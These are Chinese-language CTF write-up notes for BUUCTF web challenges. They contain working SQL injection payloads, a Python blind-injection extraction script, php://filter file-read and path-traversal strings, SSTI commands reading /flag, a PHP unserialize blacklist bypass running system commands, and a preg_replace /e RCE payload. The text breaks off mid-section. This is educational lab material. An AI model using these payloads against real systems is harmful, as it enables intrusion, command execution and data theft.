<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><h4 id="考点-5"><a href="#考点-5" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL注入</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-4"><a href="#知识点：-4" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">联合查询：</span><br><span class="line">在使用联合注入时，如果你查询的数据不存在，那么就会生成一个内容为null的虚拟数据，也就是说在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。所以这时我们就可以在注入时添加我们需要的信息来完成我们的目的。</span><br><span class="line">eg:</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-6"><a href="#解题过程：-6" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">一个登录页面，进行弱口令，还有万能密码，测试都没用，但是注意到url跳转的是search.php，于是我们直接访问，看到MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5这是一个base32卫门解码，后面是一个base64解码之后：select * from user where username = &#x27;$name&#x27;,于是我们知道参数是name;</span><br><span class="line">step2:</span><br><span class="line">测试是GET还是POST，发现是POST，进行注入，发现order by一直没用，猜测过滤了什么，于是我直接进行union select有回显，然后进行基本SQL操作时都有问题，后面我看源码，发现：</span><br><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">step3:</span><br><span class="line">payload:name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;fae0b27c451c728867a567e8c1bb4e53&#x27;#&amp;pw=666</span><br></pre></td></tr></table></figure>

<h2 id="SQL注入-HANDLER语句"><a href="#SQL注入-HANDLER语句" class="headerlink" title="SQL注入(HANDLER语句)"></a>SQL注入(HANDLER语句)</h2><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><h4 id="考点-6"><a href="#考点-6" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql注入</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-5"><a href="#知识点：-5" class="headerlink" title="知识点："></a>知识点：</h4><h5 id="当一些重要的查询语句被过滤时候可以用"><a href="#当一些重要的查询语句被过滤时候可以用" class="headerlink" title="当一些重要的查询语句被过滤时候可以用"></a>当一些重要的查询语句被过滤时候可以用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">测试过不是联合查询；是堆叠注入</span><br><span class="line">1&#x27;;show databases#</span><br><span class="line">step2: 爆表：</span><br><span class="line">1&#x27;;show tables#</span><br><span class="line">step3:爆列：</span><br><span class="line">1&#x27;;show columns from FlagHere#</span><br><span class="line">step4:爆数据：</span><br><span class="line">1&#x27;;select flag from FlagHere#</span><br><span class="line">step5:</span><br><span class="line">发现没有用，返回了过滤的</span><br><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br><span class="line">于是用HANDLER</span><br><span class="line">step6:</span><br><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;(FIRST是读取第一行，因为试READ flag没用)</span><br></pre></td></tr></table></figure>

<h2 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL(盲注)"></a>SQL(盲注)</h2><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><h4 id="考点：-2"><a href="#考点：-2" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br></pre></td></tr></table></figure>

<h4 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点:"></a>知识点:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-7"><a href="#解题过程：-7" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">输入1，2，有两种回显；于是想到布尔盲注</span><br><span class="line">step2：</span><br><span class="line">判断长度</span><br><span class="line">import requests</span><br><span class="line"> #测试flag长度</span><br><span class="line"> #空格被过滤</span><br><span class="line">url = &quot;http://7e371188-ce56-47e5-82ff-ba44e945923c.node5.buuoj.cn:81/index.php&quot;</span><br><span class="line">len = 1;</span><br><span class="line">while(True):</span><br><span class="line">    data = &#123;&quot;id&quot;: f&quot;if(length((select(flag)from(flag)))=&#123;len&#125;,1,0)&quot;&#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    if(&#x27;Hello, glzjin wants a girlfriend.&#x27; in r.text):</span><br><span class="line">        break;</span><br><span class="line">    print(len,end=&#x27;\n&#x27;)</span><br><span class="line">    len += 1</span><br><span class="line">print(f&quot;flag长度为&#123;len&#125;&quot;)</span><br><span class="line">step3:</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">url = &quot;http://7e371188-ce56-47e5-82ff-ba44e945923c.node5.buuoj.cn:81/index.php&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"> </span><br><span class="line">for x in range(1,43):</span><br><span class="line">    left = 33</span><br><span class="line">    right = 126</span><br><span class="line">    while(right &gt; left):</span><br><span class="line">        mid = int((left + right + 1) / 2)</span><br><span class="line">        data = &#123;&#x27;id&#x27;:f&quot;if(ascii(substr((select(flag)from(flag)),&#123;x&#125;,1))&gt;=&#123;mid&#125;,1,0)&quot;&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if(&#x27;Hello, glzjin wants a girlfriend.&#x27; in r.text):</span><br><span class="line">            left = mid</span><br><span class="line">        else:</span><br><span class="line">            right = mid - 1</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">    flag += chr(right)</span><br><span class="line">    print(flag)</span><br><span class="line"> </span><br><span class="line">print(f&quot;flag为&#123;flag&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="java-web"><a href="#java-web" class="headerlink" title="java web"></a>java web</h2><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><h4 id="考点-7"><a href="#考点-7" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Web.xml文件泄露:</span><br><span class="line">漏洞描述: Web.xml是Java Web应用的配置文件，位于WEB-INF目录下，通常不应被直接从Web访问到。如果Web服务器配置不当，允许直接通过URL访问WEB-INF/web.xml，攻击者就能获取到该文件的内容。这本身构成了一种信息泄露漏洞，因为web.xml可能包含了敏感信息，如数据库连接字符串、过滤器配置、servlet映射等。</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-6"><a href="#知识点：-6" class="headerlink" title="知识点："></a>知识点：</h4><h5 id="Java-web目录结构"><a href="#Java-web目录结构" class="headerlink" title="Java web目录结构"></a>Java web目录结构</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line">    </span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-8"><a href="#解题过程：-8" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">看到登录界面，尝试了下弱口令，万能密码，sql，都不是，注意到到这里有help键点了都是报java.io.FileNotFoundException:&#123;null&#125;，注意到url?filename=这里是GET,尝试一下POST filename=help.docx 所以注入点是在这</span><br><span class="line">step2:</span><br><span class="line">Java web 试一下可以直接访问/WEB-INF/web.xml，得到一个xml文件，打开看到一些配置文件信息，看到了</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"> “这段配置告诉Web容器（如Tomcat）有两个关键信息：一是存在一个名为FlagController的Servlet，它的实际类是com.wm.ctf.FlagController；二是所有路径以/Flag结尾的HTTP请求应该由这个Servlet来处理。”</span><br><span class="line">step3:</span><br><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br><span class="line">得到一个class文件，</span><br><span class="line">可以用jd-gui反编译看到base64加密的flag</span><br><span class="line">也可以用文本查看器打开，在FlagController后看到ZmxhZ3s5YWE3OTBlZi0wNjM4LTQzOGUtOTIzNC04MmZkYTBjMGQxNjR9Cg==</span><br><span class="line">解码就是答案</span><br></pre></td></tr></table></figure>





<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><h4 id="考点-8"><a href="#考点-8" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件包含</span><br></pre></td></tr></table></figure>

<h4 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php伪协议</span><br><span class="line">目录穿越</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  step1:</span><br><span class="line">打开界面，没看到什么信息，扫目录也没东西，然后看到url?category=xxx,我尝试?category=woofers&#x27;有报错</span><br><span class="line">Warning: include(woofers&#x27;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</span><br><span class="line">Warning: include(): Failed opening &#x27;woofers&#x27;.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php on line 37</span><br><span class="line">然后看到include()就是想到文件包含漏洞</span><br><span class="line">step2:</span><br><span class="line">使用php://filter/伪协议读取源码?category=php://filter/convert.base64-encode/resource=index（一开始是的index.php,但是报错）</span><br><span class="line">然后得到的base64解码得到：</span><br><span class="line">   &lt;?php</span><br><span class="line">				$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">				if(isset($file))</span><br><span class="line">				&#123;</span><br><span class="line">					if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">						include ($file . &#x27;.php&#x27;);</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				?&gt;</span><br><span class="line">看到要去参数里一定要有woofers meowers index</span><br><span class="line">step3:</span><br><span class="line">不可以直接读取flag，于是我们使用目录穿越</span><br><span class="line">?category=php://filter/convert.base64-encode/resource=index../../flag</span><br><span class="line">得到的base64解码就得到了</span><br></pre></td></tr></table></figure>

<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><h4 id="考点-9"><a href="#考点-9" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板注入</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-9"><a href="#解题过程-9" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">打开有三个界面，index.php/flag.php/hint.php,hint和index没什么用，直接看flag.php页面显示：Your IP is : 127.0.0.1 ，就想到了XFF</span><br><span class="line">step2:</span><br><span class="line">f12打开hackbar修改xff,改成1，页面显示1，试下ls /，是直接回显在上面的，没有处理这个命令，试下模板注入&#123;&#123;ls /&#125;&#125;执行了</span><br><span class="line">step3:</span><br><span class="line">&#123;&#123;ls /&#125;&#125;  &#123;&#123;cat /flag&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><h4 id="考点：-3"><a href="#考点：-3" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用反序列化绕过</span><br><span class="line">代码审计</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-10"><a href="#解题过程-10" class="headerlink" title="解题过程:"></a>解题过程:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">看到页面老是过几秒刷新一次，于是抓个包看看，看到了func=date&amp;p=Y-m-d+h%3Ai%3As+a</span><br><span class="line">这里是func应该是函数后面的p应该是函数要执行的内容，直接试一下func=system&amp;p=ls /;出现Hacker；应该是被过滤了</span><br><span class="line">step2:</span><br><span class="line">查看源码：func=file_get_contents&amp;p=index.php 拿到源码如下：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //黑名单</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">   //接收一个函数和一个参数</span><br><span class="line">   function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //一个Test</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //接受用户的值</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line">    //检查func是否为空，统一成小写，以及是否在黑名单里面</span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">step3:</span><br><span class="line">既然不能用system还有别的一些命令执行函数，看到Test就想到了反序列化，用它来绕过黑名单</span><br><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line"></span><br><span class="line">public $p = &quot;ls /&quot;;</span><br><span class="line">public $func = &quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Test();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br><span class="line">func=unserialize&amp;p=$b;</span><br><span class="line">没看到和flag相关的名字</span><br><span class="line">public $p=&quot;find / -name flag*&quot;</span><br><span class="line">找到</span><br><span class="line">然后：</span><br><span class="line">public $p = &quot;cat /tmp/flagoefiu4r93&quot;</span><br><span class="line">ps:这里要注意空格</span><br></pre></td></tr></table></figure>

<h2 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a>RCE</h2><h3 id="BJDCTF2020-ZJCTF不过如此"><a href="#BJDCTF2020-ZJCTF不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF不过如此"></a><em>[BJDCTF2020]ZJCTF不过如此</em></h3><h4 id="考点：-4"><a href="#考点：-4" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代码审计</span><br><span class="line">php伪协议</span><br><span class="line">rce</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-7"><a href="#知识点：-7" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*·正则表达式/ei匹配存在命令执行，可直接套用plyload：?\S*=$&#123;目标函数()&#125;，按题目替换下即可执行任意命令</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-9"><a href="#解题过程：-9" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">代码审计，第一步，要求传入I have a dream文件里也要有，用data伪协议写进去</span><br><span class="line">第二步是要读取网页这里过滤了flag,注意注释里有next.php我们用php://读取文件内容</span><br><span class="line">text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br><span class="line">得到一串base64解码得到</span><br><span class="line">step2:审代码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line">//这里存在漏洞</span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">step3： </span><br><span class="line">/next.php?\s*=$&#123;getFlag()&#125;&amp;cmd=sysytem(&#x27;ls /&#x27;);</span><br><span class="line">/next.php?\s*=$&#123;getFlag()&#125;&amp;cmd=sysytem(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h2><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a><em>[BUUCTF 2018]Online Tool</em></h3><h4 id="考点-10"><a href="#考点-10" class="headerlink" title="考点:"></a>考点:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nmap 写文件命令：</span><br><span class="line"></span><br><span class="line">-oN (标准输出)</span><br><span class="line"></span><br><span class="line">-oX (XML输出)</span><br><span class="line"></span><br><span class="line">-oS (ScRipT KIdd|3 oUTpuT)</span><br><span class="line"></span><br><span class="line">-oG (Grep输出)</span><br><span class="line"></span><br><span class="line">-oA (输出至所有格式)</span><br><span class="line">escapeshellarg和escapeshellcmd函数</span><br><span class="line">escapeshellarg:</span><br><span class="line">1.确保用户只传递一个参数给命令 